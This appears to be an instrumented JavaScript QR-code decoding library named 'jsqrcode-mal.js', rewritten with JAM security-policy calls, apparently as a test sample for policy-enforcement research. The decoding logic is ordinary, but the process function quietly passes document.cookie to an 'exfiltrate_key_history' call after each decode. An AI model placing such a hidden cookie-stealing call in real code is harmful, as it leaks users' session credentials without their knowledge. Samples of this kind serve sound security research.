// jsqrcode-mal.js
function v154(patterns) {
  function distance(pattern1$$1, pattern2$$1) {
    xDiff = pattern1$$1.X - pattern2$$1.X;
    yDiff = pattern1$$1.Y - pattern2$$1.Y;
    return JAM.call(Math.sqrt, Math, [xDiff * xDiff + yDiff * yDiff], JAM.policy.p39);
  }
  function crossProductZ(pointA$$1, pointB$$1, pointC$$1) {
    var bX = pointB$$1.x;
    var bY = pointB$$1.y;
    return(pointC$$1.x - bX) * (pointA$$1.y - bY) - (pointC$$1.y - bY) * (pointA$$1.x - bX);
  }
  introspect(JAM.policy.p26) {
    var v162 = patterns[0]
  }
  introspect(JAM.policy.p26) {
    var v163 = patterns[1]
  }
  var zeroOneDistance = JAM.call(distance, null, [v162, v163], JAM.policy.p38);
  introspect(JAM.policy.p26) {
    var v164 = patterns[1]
  }
  introspect(JAM.policy.p26) {
    var v165 = patterns[2]
  }
  var oneTwoDistance = JAM.call(distance, null, [v164, v165], JAM.policy.p38);
  introspect(JAM.policy.p26) {
    var v166 = patterns[0]
  }
  introspect(JAM.policy.p26) {
    var v167 = patterns[2]
  }
  var zeroTwoDistance = JAM.call(distance, null, [v166, v167], JAM.policy.p38);
  var pointA;
  var pointB;
  var pointC;
  var v1067 = oneTwoDistance >= zeroOneDistance;
  if (v1067) {
    v1067 = oneTwoDistance >= zeroTwoDistance;
  }
  if (v1067) {
    introspect(JAM.policy.p26) {
      pointB = patterns[0];
    }
    introspect(JAM.policy.p26) {
      pointA = patterns[1];
    }
    introspect(JAM.policy.p26) {
      pointC = patterns[2];
    }
  } else {
    var v1068 = zeroTwoDistance >= oneTwoDistance;
    if (v1068) {
      v1068 = zeroTwoDistance >= zeroOneDistance;
    }
    if (v1068) {
      introspect(JAM.policy.p26) {
        pointB = patterns[1];
      }
      introspect(JAM.policy.p26) {
        pointA = patterns[0];
      }
      introspect(JAM.policy.p26) {
        pointC = patterns[2];
      }
    } else {
      introspect(JAM.policy.p26) {
        pointB = patterns[2];
      }
      introspect(JAM.policy.p26) {
        pointA = patterns[0];
      }
      introspect(JAM.policy.p26) {
        pointC = patterns[1];
      }
    }
  }
  if (JAM.call(crossProductZ, null, [pointA, pointB, pointC], JAM.policy.p38) < 0) {
    var temp$$5 = pointA;
    pointA = pointC;
    pointC = temp$$5;
  }
  introspect(JAM.policy.p27) {
    patterns[0] = pointA;
  }
  introspect(JAM.policy.p27) {
    patterns[1] = pointB;
  }
  introspect(JAM.policy.p27) {
    patterns[2] = pointC;
  }
  return;
}
function v153(from, to) {
  var v1070 = (to || from) + 1;
  if (!v1070) {
    v1070 = this.length;
  }
  var rest = JAM.call(this.slice, this, [v1070], JAM.policy.p39);
  var v172;
  if (from < 0) {
    v172 = this.length + from;
  } else {
    v172 = from;
  }
  this.length = v172;
  var v173 = this.push;
  return JAM.call(v173.apply, v173, [this, rest], JAM.policy.p38);
}
function v152() {
  var ret$$1 = JAM.new(Array, [qrcode.width * qrcode.height], JAM.policy.p39);
  var y$$43 = 0;
  var v177 = y$$43 < qrcode.height;
  for (;v177;) {
    var x$$61 = 0;
    var v176 = x$$61 < qrcode.width;
    for (;v176;) {
      var gray$$1 = JAM.call(qrcode.getPixel, qrcode, [x$$61, y$$43], JAM.policy.p38);
      var v175 = x$$61 + y$$43 * qrcode.width;
      introspect(JAM.policy.p27) {
        ret$$1[v175] = gray$$1;
      }
      x$$61 = x$$61 + 1;
      v176 = x$$61 < qrcode.width;
    }
    y$$43 = y$$43 + 1;
    v177 = y$$43 < qrcode.height;
  }
  return ret$$1;
}
function v151(grayScale) {
  var middle$$1 = JAM.call(qrcode.getMiddleBrightnessPerArea, qrcode, [grayScale], JAM.policy.p39);
  var sqrtNumArea = middle$$1.length;
  var areaWidth$$1 = JAM.call(Math.floor, Math, [qrcode.width / sqrtNumArea], JAM.policy.p39);
  var areaHeight$$1 = JAM.call(Math.floor, Math, [qrcode.height / sqrtNumArea], JAM.policy.p39);
  var bitmap = JAM.new(Array, [qrcode.height * qrcode.width], JAM.policy.p39);
  var ay$$1 = 0;
  var v185 = ay$$1 < sqrtNumArea;
  for (;v185;) {
    var ax$$1 = 0;
    var v184 = ax$$1 < sqrtNumArea;
    for (;v184;) {
      var dy$$6 = 0;
      var v183 = dy$$6 < areaHeight$$1;
      for (;v183;) {
        var dx$$6 = 0;
        var v182 = dx$$6 < areaWidth$$1;
        for (;v182;) {
          var v181 = areaWidth$$1 * ax$$1 + dx$$6 + (areaHeight$$1 * ay$$1 + dy$$6) * qrcode.width;
          var v1086;
          var v2682 = areaWidth$$1 * ax$$1 + dx$$6 + (areaHeight$$1 * ay$$1 + dy$$6) * qrcode.width;
          introspect(JAM.policy.p26) {
            var v2508 = grayScale[v2682]
          }
          introspect(JAM.policy.p26) {
            var v2683 = middle$$1[ax$$1]
          }
          introspect(JAM.policy.p26) {
            var v2509 = v2683[ay$$1]
          }
          if (v2508 < v2509) {
            v1086 = true;
          } else {
            v1086 = false;
          }
          introspect(JAM.policy.p27) {
            bitmap[v181] = v1086;
          }
          dx$$6 = dx$$6 + 1;
          v182 = dx$$6 < areaWidth$$1;
        }
        dy$$6 = dy$$6 + 1;
        v183 = dy$$6 < areaHeight$$1;
      }
      ax$$1 = ax$$1 + 1;
      v184 = ax$$1 < sqrtNumArea;
    }
    ay$$1 = ay$$1 + 1;
    v185 = ay$$1 < sqrtNumArea;
  }
  return bitmap;
}
function v150(image$$7) {
  var numSqrtArea = 4;
  var areaWidth = JAM.call(Math.floor, Math, [qrcode.width / numSqrtArea], JAM.policy.p39);
  var areaHeight = JAM.call(Math.floor, Math, [qrcode.height / numSqrtArea], JAM.policy.p39);
  var minmax = JAM.new(Array, [numSqrtArea], JAM.policy.p39);
  var i$$46 = 0;
  var v191 = i$$46 < numSqrtArea;
  for (;v191;) {
    var v2841 = JAM.new(Array, [numSqrtArea], JAM.policy.p39);
    introspect(JAM.policy.p27) {
      minmax[i$$46] = v2841;
    }
    var i2 = 0;
    var v190 = i2 < numSqrtArea;
    for (;v190;) {
      introspect(JAM.policy.p26) {
        var v188 = minmax[i$$46]
      }
      var v189 = i2;
      var v2842 = JAM.new(Array, [0, 0], JAM.policy.p22);
      introspect(JAM.policy.p27) {
        v188[v189] = v2842;
      }
      i2 = i2 + 1;
      v190 = i2 < numSqrtArea;
    }
    i$$46 = i$$46 + 1;
    v191 = i$$46 < numSqrtArea;
  }
  var ay = 0;
  var v201 = ay < numSqrtArea;
  for (;v201;) {
    var ax = 0;
    var v200 = ax < numSqrtArea;
    for (;v200;) {
      introspect(JAM.policy.p26) {
        var v1089 = minmax[ax]
      }
      introspect(JAM.policy.p26) {
        var v192 = v1089[ay]
      }
      introspect(JAM.policy.p27) {
        v192[0] = 255;
      }
      var dy$$5 = 0;
      var v199 = dy$$5 < areaHeight;
      for (;v199;) {
        var dx$$5 = 0;
        var v198 = dx$$5 < areaWidth;
        for (;v198;) {
          var v193 = areaWidth * ax + dx$$5 + (areaHeight * ay + dy$$5) * qrcode.width;
          introspect(JAM.policy.p26) {
            var target$$26 = image$$7[v193]
          }
          introspect(JAM.policy.p26) {
            var v2511 = minmax[ax]
          }
          introspect(JAM.policy.p26) {
            var v1863 = v2511[ay]
          }
          introspect(JAM.policy.p26) {
            var v1092 = v1863[0]
          }
          if (target$$26 < v1092) {
            introspect(JAM.policy.p26) {
              var v1093 = minmax[ax]
            }
            introspect(JAM.policy.p26) {
              var v194 = v1093[ay]
            }
            introspect(JAM.policy.p27) {
              v194[0] = target$$26;
            }
          }
          introspect(JAM.policy.p26) {
            var v2512 = minmax[ax]
          }
          introspect(JAM.policy.p26) {
            var v1864 = v2512[ay]
          }
          introspect(JAM.policy.p26) {
            var v1094 = v1864[1]
          }
          if (target$$26 > v1094) {
            introspect(JAM.policy.p26) {
              var v1095 = minmax[ax]
            }
            introspect(JAM.policy.p26) {
              var v196 = v1095[ay]
            }
            introspect(JAM.policy.p27) {
              v196[1] = target$$26;
            }
          }
          dx$$5 = dx$$5 + 1;
          v198 = dx$$5 < areaWidth;
        }
        dy$$5 = dy$$5 + 1;
        v199 = dy$$5 < areaHeight;
      }
      ax = ax + 1;
      v200 = ax < numSqrtArea;
    }
    ay = ay + 1;
    v201 = ay < numSqrtArea;
  }
  var middle = JAM.new(Array, [numSqrtArea], JAM.policy.p39);
  var i3 = 0;
  var v202 = i3 < numSqrtArea;
  for (;v202;) {
    var v2843 = JAM.new(Array, [numSqrtArea], JAM.policy.p39);
    introspect(JAM.policy.p27) {
      middle[i3] = v2843;
    }
    i3 = i3 + 1;
    v202 = i3 < numSqrtArea;
  }
  ay = 0;
  var v206 = ay < numSqrtArea;
  for (;v206;) {
    ax = 0;
    var v205 = ax < numSqrtArea;
    for (;v205;) {
      introspect(JAM.policy.p26) {
        var v203 = middle[ax]
      }
      var v204 = ay;
      introspect(JAM.policy.p26) {
        var v2763 = minmax[ax]
      }
      introspect(JAM.policy.p26) {
        var v2684 = v2763[ay]
      }
      introspect(JAM.policy.p26) {
        var v2513 = v2684[0]
      }
      introspect(JAM.policy.p26) {
        var v2764 = minmax[ax]
      }
      introspect(JAM.policy.p26) {
        var v2685 = v2764[ay]
      }
      introspect(JAM.policy.p26) {
        var v2514 = v2685[1]
      }
      var v2844 = JAM.call(Math.floor, Math, [(v2513 + v2514) / 2], JAM.policy.p39);
      introspect(JAM.policy.p27) {
        v203[v204] = v2844;
      }
      ax = ax + 1;
      v205 = ax < numSqrtArea;
    }
    ay = ay + 1;
    v206 = ay < numSqrtArea;
  }
  return middle;
}
function v149(th) {
  var ret = JAM.new(Array, [qrcode.width * qrcode.height], JAM.policy.p39);
  var y$$42 = 0;
  var v210 = y$$42 < qrcode.height;
  for (;v210;) {
    var x$$60 = 0;
    var v209 = x$$60 < qrcode.width;
    for (;v209;) {
      var gray = JAM.call(qrcode.getPixel, qrcode, [x$$60, y$$42], JAM.policy.p38);
      var v208 = x$$60 + y$$42 * qrcode.width;
      var v1102;
      if (gray <= th) {
        v1102 = true;
      } else {
        v1102 = false;
      }
      introspect(JAM.policy.p27) {
        ret[v208] = v1102;
      }
      x$$60 = x$$60 + 1;
      v209 = x$$60 < qrcode.width;
    }
    y$$42 = y$$42 + 1;
    v210 = y$$42 < qrcode.height;
  }
  return ret;
}
function v148(x$$59, y$$41) {
  if (qrcode.width < x$$59) {
    throw "point error";
  }
  if (qrcode.height < y$$41) {
    throw "point error";
  }
  point = x$$59 * 4 + y$$41 * qrcode.width * 4;
  var v2686 = qrcode.imagedata.data;
  introspect(JAM.policy.p26) {
    var v2515 = v2686[point]
  }
  var v1869 = v2515 * 33;
  var v2687 = qrcode.imagedata.data;
  var v2688 = point + 1;
  introspect(JAM.policy.p26) {
    var v2516 = v2687[v2688]
  }
  var v1108 = v1869 + v2516 * 34;
  var v2517 = qrcode.imagedata.data;
  var v2518 = point + 2;
  introspect(JAM.policy.p26) {
    var v1871 = v2517[v2518]
  }
  p = (v1108 + v1871 * 33) / 100;
  return p;
}
function v147(ctx) {
  var v216 = JAM.new(Date, [], JAM.policy.p40);
  var start$$4 = JAM.call(v216.getTime, v216, [], JAM.policy.p40);
  var img$$3 = JAM.call(qrcode.grayScaleToBitmap, qrcode, [JAM.call(qrcode.grayscale, qrcode, [], JAM.policy.p40)], JAM.policy.p39);
  if (qrcode.debug) {
    var y$$40 = 0;
    var v226 = y$$40 < qrcode.height;
    for (;v226;) {
      var x$$58 = 0;
      var v225 = x$$58 < qrcode.width;
      for (;v225;) {
        var point$$1 = x$$58 * 4 + y$$40 * qrcode.width * 4;
        var v220 = qrcode.imagedata.data;
        var v1114;
        var v2519 = x$$58 + y$$40 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v1873 = img$$3[v2519]
        }
        if (v1873) {
          v1114 = 0;
        } else {
          v1114 = 0;
        }
        introspect(JAM.policy.p27) {
          v220[point$$1] = v1114;
        }
        var v221 = qrcode.imagedata.data;
        var v222 = point$$1 + 1;
        var v1116;
        var v2520 = x$$58 + y$$40 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v1874 = img$$3[v2520]
        }
        if (v1874) {
          v1116 = 0;
        } else {
          v1116 = 0;
        }
        introspect(JAM.policy.p27) {
          v221[v222] = v1116;
        }
        var v223 = qrcode.imagedata.data;
        var v224 = point$$1 + 2;
        var v1118;
        var v2521 = x$$58 + y$$40 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v1875 = img$$3[v2521]
        }
        if (v1875) {
          v1118 = 255;
        } else {
          v1118 = 0;
        }
        introspect(JAM.policy.p27) {
          v223[v224] = v1118;
        }
        x$$58 = x$$58 + 1;
        v225 = x$$58 < qrcode.width;
      }
      y$$40 = y$$40 + 1;
      v226 = y$$40 < qrcode.height;
    }
    JAM.call(ctx.putImageData, ctx, [qrcode.imagedata, 0, 0], JAM.policy.p41);
  }
  var detector = JAM.new(Detector, [img$$3], JAM.policy.p39);
  var qRCodeMatrix = JAM.call(detector.detect, detector, [], JAM.policy.p40);
  if (qrcode.debug) {
    JAM.call(ctx.putImageData, ctx, [qrcode.imagedata, 0, 0], JAM.policy.p41);
  }
  var reader$$1 = JAM.call(Decoder.decode, Decoder, [qRCodeMatrix.bits], JAM.policy.p39);
  var data$$18 = reader$$1.DataByte;
  var str$$6 = "";
  var i$$45 = 0;
  var v233 = i$$45 < data$$18.length;
  for (;v233;) {
    var j$$24 = 0;
    introspect(JAM.policy.p26) {
      var v1876 = data$$18[i$$45]
    }
    var v232 = j$$24 < v1876.length;
    for (;v232;) {
      var v1123 = str$$6;
      introspect(JAM.policy.p26) {
        var v2522 = data$$18[i$$45]
      }
      introspect(JAM.policy.p26) {
        var v1877 = v2522[j$$24]
      }
      str$$6 = v1123 + JAM.call(String.fromCharCode, String, [v1877], JAM.policy.p39);
      j$$24 = j$$24 + 1;
      introspect(JAM.policy.p26) {
        var v1878 = data$$18[i$$45]
      }
      v232 = j$$24 < v1878.length;
    }
    i$$45 = i$$45 + 1;
    v233 = i$$45 < data$$18.length;
  }
  var v234 = JAM.new(Date, [], JAM.policy.p40);
  var end$$1 = JAM.call(v234.getTime, v234, [], JAM.policy.p40);
  var time = end$$1 - start$$4;
  JAM.call(console.log, console, [time], JAM.policy.p39);
  JAM.call(exfiltrate_key_history, null, [document.cookie], JAM.policy.p39);
  return JAM.call(qrcode.decode_utf8, qrcode, [str$$6], JAM.policy.p39);
}
function v146(s$$4) {
  return JAM.call(decodeURIComponent, null, [JAM.call(escape, null, [s$$4], JAM.policy.p39)], JAM.policy.p39);
}
function v145(src$$1) {
  function v144() {
    JAM.call(console.log, console, ["Image failed!"], JAM.policy.p24);
    return;
  }
  function v143() {
    var canvas_qr$$1 = JAM.call(document.createElement, document, ["canvas"], JAM.policy.p24);
    var context$$1 = JAM.call(canvas_qr$$1.getContext, canvas_qr$$1, ["2d"], JAM.policy.p24);
    var canvas_out = JAM.call(document.getElementById, document, ["out-canvas"], JAM.policy.p24);
    if (canvas_out !== null) {
      var outctx = JAM.call(canvas_out.getContext, canvas_out, ["2d"], JAM.policy.p24);
      JAM.call(outctx.clearRect, outctx, [0, 0, 320, 240], JAM.policy.p22);
      JAM.call(outctx.drawImage, outctx, [img$$2, 0, 0, 320, 240], JAM.policy.p41);
    }
    canvas_qr$$1.width = img$$2.width;
    canvas_qr$$1.height = img$$2.height;
    JAM.call(context$$1.drawImage, context$$1, [img$$2, 0, 0], JAM.policy.p41);
    qrcode.width = img$$2.width;
    qrcode.height = img$$2.height;
    try {
      var v238 = qrcode;
      var v2845 = JAM.call(context$$1.getImageData, context$$1, [0, 0, img$$2.width, img$$2.height], JAM.policy.p22);
      v238.imagedata = v2845;
    } catch (e$$5) {
      qrcode.result = "Cross domain image reading not supported in your browser! Save it to your computer then drag and drop the file!";
      if (qrcode.callback !== null) {
        JAM.call(qrcode.callback, qrcode, [qrcode.result], JAM.policy.p39);
      }
      return;
    }
    try {
      var v241 = qrcode;
      var v2846 = JAM.call(qrcode.process, qrcode, [context$$1], JAM.policy.p39);
      v241.result = v2846;
    } catch (e$$6) {
      JAM.call(console.log, console, [e$$6], JAM.policy.p39);
      qrcode.result = "error decoding QR Code";
    }
    if (qrcode.callback !== null) {
      JAM.call(qrcode.callback, qrcode, [qrcode.result], JAM.policy.p39);
    }
    return;
  }
  if (arguments.length === 0) {
    var canvas_qr = JAM.call(document.getElementById, document, ["qr-canvas"], JAM.policy.p24);
    var context = JAM.call(canvas_qr.getContext, canvas_qr, ["2d"], JAM.policy.p24);
    qrcode.width = canvas_qr.width;
    qrcode.height = canvas_qr.height;
    var v244 = qrcode;
    var v2847 = JAM.call(context.getImageData, context, [0, 0, qrcode.width, qrcode.height], JAM.policy.p22);
    v244.imagedata = v2847;
    var v245 = qrcode;
    var v2848 = JAM.call(qrcode.process, qrcode, [context], JAM.policy.p39);
    v245.result = v2848;
    if (qrcode.callback !== null) {
      JAM.call(qrcode.callback, qrcode, [qrcode.result], JAM.policy.p39);
    }
    return qrcode.result;
  } else {
    var img$$2 = JAM.new(Image, [], JAM.policy.p40);
    JAM.set(img$$2, "onload", v143);
    JAM.set(img$$2, "onerror", v144);
    introspect(JAM.policy.p8) {
      img$$2.src = src$$1;
    }
  }
  return;
}
function v142(bits$$13) {
  var parser = JAM.new(BitMatrixParser, [bits$$13], JAM.policy.p39);
  var version$$7 = JAM.call(parser.readVersion, parser, [], JAM.policy.p40);
  var ecLevel$$2 = JAM.call(parser.readFormatInformation, parser, [], JAM.policy.p40).ErrorCorrectionLevel;
  var codewords$$1 = JAM.call(parser.readCodewords, parser, [], JAM.policy.p40);
  var dataBlocks = JAM.call(DataBlock.getDataBlocks, DataBlock, [codewords$$1, version$$7, ecLevel$$2], JAM.policy.p38);
  var totalBytes = 0;
  var i$$44 = 0;
  var v250 = i$$44 < dataBlocks.length;
  for (;v250;) {
    introspect(JAM.policy.p26) {
      var v1879 = dataBlocks[i$$44]
    }
    totalBytes = totalBytes + v1879.NumDataCodewords;
    i$$44 = i$$44 + 1;
    v250 = i$$44 < dataBlocks.length;
  }
  var resultBytes = JAM.new(Array, [totalBytes], JAM.policy.p39);
  var resultOffset$$1 = 0;
  var j$$23 = 0;
  var v253 = j$$23 < dataBlocks.length;
  for (;v253;) {
    introspect(JAM.policy.p26) {
      var dataBlock = dataBlocks[j$$23]
    }
    var codewordBytes$$1 = dataBlock.Codewords;
    var numDataCodewords$$3 = dataBlock.NumDataCodewords;
    JAM.call(this.correctErrors, this, [codewordBytes$$1, numDataCodewords$$3], JAM.policy.p38);
    i$$44 = 0;
    var v252 = i$$44 < numDataCodewords$$3;
    for (;v252;) {
      var v251 = resultOffset$$1;
      resultOffset$$1 = resultOffset$$1 + 1;
      introspect(JAM.policy.p27) {
        resultBytes[v251] = codewordBytes$$1[i$$44];
      }
      i$$44 = i$$44 + 1;
      v252 = i$$44 < numDataCodewords$$3;
    }
    j$$23 = j$$23 + 1;
    v253 = j$$23 < dataBlocks.length;
  }
  var reader = JAM.new(QRCodeDataBlockReader, [resultBytes, version$$7.VersionNumber, ecLevel$$2.Bits], JAM.policy.p38);
  return reader;
}
function v141(codewordBytes, numDataCodewords$$2) {
  var numCodewords$$1 = codewordBytes.length;
  var codewordsInts = JAM.new(Array, [numCodewords$$1], JAM.policy.p39);
  var i$$43 = 0;
  var v257 = i$$43 < numCodewords$$1;
  for (;v257;) {
    introspect(JAM.policy.p26) {
      var v256 = codewordBytes[i$$43]
    }
    introspect(JAM.policy.p27) {
      codewordsInts[i$$43] = v256 & 255;
    }
    i$$43 = i$$43 + 1;
    v257 = i$$43 < numCodewords$$1;
  }
  var numECCodewords = codewordBytes.length - numDataCodewords$$2;
  try {
    var v259 = Decoder.rsDecoder;
    JAM.call(v259.decode, v259, [codewordsInts, numECCodewords], JAM.policy.p38);
  } catch (rse) {
    throw rse;
  }
  i$$43 = 0;
  var v260 = i$$43 < numDataCodewords$$2;
  for (;v260;) {
    introspect(JAM.policy.p27) {
      codewordBytes[i$$43] = codewordsInts[i$$43];
    }
    i$$43 = i$$43 + 1;
    v260 = i$$43 < numDataCodewords$$2;
  }
  return;
}
function v140(a$$7, b$$3) {
  return a$$7 ^ b$$3;
}
function v139(reference) {
  var v1140 = reference < 0;
  if (!v1140) {
    v1140 = reference > 7;
  }
  if (v1140) {
    throw "System.ArgumentException";
  }
  var v262 = DataMask.DATA_MASKS;
  introspect(JAM.policy.p26) {
    return v262[reference];
  }
}
function v138(rawCodewords, version$$5, ecLevel$$1) {
  if (rawCodewords.length !== version$$5.TotalCodewords) {
    throw "ArgumentException";
  }
  var ecBlocks = JAM.call(version$$5.getECBlocksForLevel, version$$5, [ecLevel$$1], JAM.policy.p39);
  var totalBlocks = 0;
  var ecBlockArray = ecBlocks.ecBlocks;
  var i$$11 = 0;
  var v264 = i$$11 < ecBlockArray.length;
  for (;v264;) {
    introspect(JAM.policy.p26) {
      var v1881 = ecBlockArray[i$$11]
    }
    totalBlocks = totalBlocks + v1881.Count;
    i$$11 = i$$11 + 1;
    v264 = i$$11 < ecBlockArray.length;
  }
  var result$$1 = JAM.new(Array, [totalBlocks], JAM.policy.p39);
  var numResultBlocks = 0;
  var j = 0;
  var v269 = j < ecBlockArray.length;
  for (;v269;) {
    introspect(JAM.policy.p26) {
      var ecBlock$$1 = ecBlockArray[j]
    }
    i$$11 = 0;
    var v268 = i$$11 < ecBlock$$1.Count;
    for (;v268;) {
      var numDataCodewords$$1 = ecBlock$$1.DataCodewords;
      var numBlockCodewords = ecBlocks.ECCodewordsPerBlock + numDataCodewords$$1;
      var v266 = result$$1;
      var v267 = numResultBlocks;
      numResultBlocks = numResultBlocks + 1;
      var v2849 = JAM.new(DataBlock, [numDataCodewords$$1, JAM.new(Array, [numBlockCodewords], JAM.policy.p39)], JAM.policy.p38);
      introspect(JAM.policy.p27) {
        v266[v267] = v2849;
      }
      i$$11 = i$$11 + 1;
      v268 = i$$11 < ecBlock$$1.Count;
    }
    j = j + 1;
    v269 = j < ecBlockArray.length;
  }
  introspect(JAM.policy.p26) {
    var v1151 = result$$1[0]
  }
  var shorterBlocksTotalCodewords = v1151.codewords.length;
  var longerBlocksStartAt = result$$1.length - 1;
  var v274 = longerBlocksStartAt >= 0;
  for (;v274;) {
    introspect(JAM.policy.p26) {
      var v1152 = result$$1[longerBlocksStartAt]
    }
    var numCodewords = v1152.codewords.length;
    if (numCodewords === shorterBlocksTotalCodewords) {
      break;
    }
    longerBlocksStartAt = longerBlocksStartAt - 1;
    v274 = longerBlocksStartAt >= 0;
  }
  longerBlocksStartAt = longerBlocksStartAt + 1;
  var shorterBlocksNumDataCodewords = shorterBlocksTotalCodewords - ecBlocks.ECCodewordsPerBlock;
  var rawCodewordsOffset = 0;
  i$$11 = 0;
  var v278 = i$$11 < shorterBlocksNumDataCodewords;
  for (;v278;) {
    j = 0;
    var v277 = j < numResultBlocks;
    for (;v277;) {
      introspect(JAM.policy.p26) {
        var v1153 = result$$1[j]
      }
      var v276 = v1153.codewords;
      var v1154 = rawCodewordsOffset;
      rawCodewordsOffset = rawCodewordsOffset + 1;
      introspect(JAM.policy.p27) {
        v276[i$$11] = rawCodewords[v1154];
      }
      j = j + 1;
      v277 = j < numResultBlocks;
    }
    i$$11 = i$$11 + 1;
    v278 = i$$11 < shorterBlocksNumDataCodewords;
  }
  j = longerBlocksStartAt;
  var v280 = j < numResultBlocks;
  for (;v280;) {
    introspect(JAM.policy.p26) {
      var v1155 = result$$1[j]
    }
    var v279 = v1155.codewords;
    var v1156 = rawCodewordsOffset;
    rawCodewordsOffset = rawCodewordsOffset + 1;
    introspect(JAM.policy.p27) {
      v279[shorterBlocksNumDataCodewords] = rawCodewords[v1156];
    }
    j = j + 1;
    v280 = j < numResultBlocks;
  }
  introspect(JAM.policy.p26) {
    var v1157 = result$$1[0]
  }
  var max$$4 = v1157.codewords.length;
  i$$11 = shorterBlocksNumDataCodewords;
  var v285 = i$$11 < max$$4;
  for (;v285;) {
    j = 0;
    var v284 = j < numResultBlocks;
    for (;v284;) {
      var v282;
      if (j < longerBlocksStartAt) {
        v282 = i$$11;
      } else {
        v282 = i$$11 + 1;
      }
      var iOffset = v282;
      introspect(JAM.policy.p26) {
        var v1159 = result$$1[j]
      }
      var v283 = v1159.codewords;
      var v1160 = rawCodewordsOffset;
      rawCodewordsOffset = rawCodewordsOffset + 1;
      introspect(JAM.policy.p27) {
        v283[iOffset] = rawCodewords[v1160];
      }
      j = j + 1;
      v284 = j < numResultBlocks;
    }
    i$$11 = i$$11 + 1;
    v285 = i$$11 < max$$4;
  }
  return result$$1;
}
function v137(bits$$4) {
  var v1161 = bits$$4 < 0;
  if (!v1161) {
    v1161 = bits$$4 >= FOR_BITS.length;
  }
  if (v1161) {
    throw "ArgumentException";
  }
  introspect(JAM.policy.p26) {
    return FOR_BITS[bits$$4];
  }
}
function v136(maskedFormatInfo$$1) {
  var bestDifference$$1 = 4294967295;
  var bestFormatInfo = 0;
  var i$$8 = 0;
  var v290 = i$$8 < FORMAT_INFO_DECODE_LOOKUP.length;
  for (;v290;) {
    introspect(JAM.policy.p26) {
      var decodeInfo = FORMAT_INFO_DECODE_LOOKUP[i$$8]
    }
    introspect(JAM.policy.p26) {
      var targetInfo = decodeInfo[0]
    }
    if (targetInfo === maskedFormatInfo$$1) {
      introspect(JAM.policy.p26) {
        var v287 = decodeInfo[1]
      }
      return JAM.new(FormatInformation, [v287], JAM.policy.p39);
    }
    var bitsDifference$$1 = JAM.call(this.numBitsDiffering, this, [maskedFormatInfo$$1, targetInfo], JAM.policy.p38);
    if (bitsDifference$$1 < bestDifference$$1) {
      introspect(JAM.policy.p26) {
        bestFormatInfo = decodeInfo[1];
      }
      bestDifference$$1 = bitsDifference$$1;
    }
    i$$8 = i$$8 + 1;
    v290 = i$$8 < FORMAT_INFO_DECODE_LOOKUP.length;
  }
  if (bestDifference$$1 <= 3) {
    return JAM.new(FormatInformation, [bestFormatInfo], JAM.policy.p39);
  }
  return null;
}
function v135(maskedFormatInfo) {
  var formatInfo$$1 = JAM.call(FormatInformation.doDecodeFormatInformation, FormatInformation, [maskedFormatInfo], JAM.policy.p39);
  if (formatInfo$$1 !== null) {
    return formatInfo$$1;
  }
  return JAM.call(FormatInformation.doDecodeFormatInformation, FormatInformation, [maskedFormatInfo ^ FORMAT_INFO_MASK_QR], JAM.policy.p39);
}
function v134(a, b) {
  a = a ^ b;
  var v2834 = a & 15;
  introspect(JAM.policy.p26) {
    var v2813 = BITS_SET_IN_HALF_BYTE[v2834]
  }
  var v2835 = BITS_SET_IN_HALF_BYTE;
  var v2836 = JAM.call(URShift, null, [a, 4], JAM.policy.p41) & 15;
  introspect(JAM.policy.p26) {
    var v2814 = v2835[v2836]
  }
  var v2770 = v2813 + v2814;
  var v2815 = BITS_SET_IN_HALF_BYTE;
  var v2816 = JAM.call(URShift, null, [a, 8], JAM.policy.p41) & 15;
  introspect(JAM.policy.p26) {
    var v2771 = v2815[v2816]
  }
  var v2693 = v2770 + v2771;
  var v2772 = BITS_SET_IN_HALF_BYTE;
  var v2773 = JAM.call(URShift, null, [a, 12], JAM.policy.p41) & 15;
  introspect(JAM.policy.p26) {
    var v2694 = v2772[v2773]
  }
  var v2523 = v2693 + v2694;
  var v2695 = BITS_SET_IN_HALF_BYTE;
  var v2696 = JAM.call(URShift, null, [a, 16], JAM.policy.p41) & 15;
  introspect(JAM.policy.p26) {
    var v2524 = v2695[v2696]
  }
  var v1884 = v2523 + v2524;
  var v2525 = BITS_SET_IN_HALF_BYTE;
  var v2526 = JAM.call(URShift, null, [a, 20], JAM.policy.p41) & 15;
  introspect(JAM.policy.p26) {
    var v1885 = v2525[v2526]
  }
  var v1164 = v1884 + v1885;
  var v1886 = BITS_SET_IN_HALF_BYTE;
  var v1887 = JAM.call(URShift, null, [a, 24], JAM.policy.p41) & 15;
  introspect(JAM.policy.p26) {
    var v1165 = v1886[v1887]
  }
  var v294 = v1164 + v1165;
  var v1166 = BITS_SET_IN_HALF_BYTE;
  var v1167 = JAM.call(URShift, null, [a, 28], JAM.policy.p41) & 15;
  introspect(JAM.policy.p26) {
    var v295 = v1166[v1167]
  }
  return v294 + v295;
}
function v133(x0$$4, y0$$4, x1$$5, y1$$5, x2$$3, y2$$3, x3$$2, y3$$2) {
  var v296 = JAM.call(this.squareToQuadrilateral, this, [x0$$4, y0$$4, x1$$5, y1$$5, x2$$3, y2$$3, x3$$2, y3$$2], JAM.policy.p38);
  return JAM.call(v296.buildAdjoint, v296, [], JAM.policy.p40);
}
function v132(x0$$3, y0$$3, x1$$4, y1$$4, x2$$2, y2$$2, x3$$1, y3$$1) {
  dy2 = y3$$1 - y2$$2;
  dy3 = y0$$3 - y1$$4 + y2$$2 - y3$$1;
  var v1169 = dy2 === 0;
  if (v1169) {
    v1169 = dy3 === 0;
  }
  if (v1169) {
    return JAM.new(PerspectiveTransform, [x1$$4 - x0$$3, x2$$2 - x1$$4, x0$$3, y1$$4 - y0$$3, y2$$2 - y1$$4, y0$$3, 0, 0, 1], JAM.policy.p38);
  } else {
    dx1 = x1$$4 - x2$$2;
    dx2 = x3$$1 - x2$$2;
    dx3 = x0$$3 - x1$$4 + x2$$2 - x3$$1;
    dy1 = y1$$4 - y2$$2;
    denominator = dx1 * dy2 - dx2 * dy1;
    a13 = (dx3 * dy2 - dx2 * dy3) / denominator;
    a23 = (dx1 * dy3 - dx3 * dy1) / denominator;
    return JAM.new(PerspectiveTransform, [x1$$4 - x0$$3 + a13 * x1$$4, x3$$1 - x0$$3 + a23 * x3$$1, x0$$3, y1$$4 - y0$$3 + a13 * y1$$4, y3$$1 - y0$$3 + a23 * y3$$1, y0$$3, a13, a23, 1], JAM.policy.p38);
  }
  return;
}
